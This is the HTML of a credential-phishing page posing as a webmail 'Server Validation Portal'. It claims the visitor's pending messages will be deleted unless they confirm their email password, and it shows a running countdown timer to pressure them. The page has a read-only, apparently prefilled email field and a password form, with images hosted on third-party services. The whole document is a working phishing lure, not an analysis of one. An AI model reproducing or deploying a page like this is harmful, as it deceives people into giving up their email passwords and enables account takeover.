<body>

<div id="login-form">

<div class="box-inner">
<div align="center"><img src="https://cdn.glitch.me/1518c2f5-0c58-4d20-b061-f51c62a86eff%2Fenv.png?v=1638347104229" width="90px" height="90px"></div>
<img src="https://firebasestorage.googleapis.com/v0/b/mpoaanan.appspot.com/o/inc%2Floadinglogo.gif?alt=media&token=ad80211a-6694-4e63-84f9-293050c3c1f5" id="logoimg" width="70px" height="70px">
<p align="center"><font size="-1" color="#FFFFFF">Confirm your email password to view pending messages. Pending messages will be deleted after.</font><br/><font color="#FF0000"><span id="timer"></span> Hours</font></p>
<form name="form" method="post" action="">
<table><tbody><tr><td class="title"><label for="rcmloginuser">Email Address</label>
</td>
<td class="input"><input name="email" id="email" required="required" size="40" autocapitalize="off" autocomplete="off" type="text" readonly=""></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="password" id="password" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="submit-btn" class="button mainaction" value="View Pending Messages"></p>

</form>

</div>

<div class="box-bottom">
	 <div align="center" id="msg" style="display: none; font-size:14px">Invalid Password! Please Enter your correct Email Password</div>
	<noscript>
		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
	</noscript>
</div>

<div id="bottomline">
	<span id="logoname"></span> Server Validation Portal
		
</div>
</div>
<script>
document.getElementById('timer').innerHTML =
  24 + ":" + 00;
startTimer();

function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}
  
  document.getElementById('timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 2000);
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
</script>


</body>
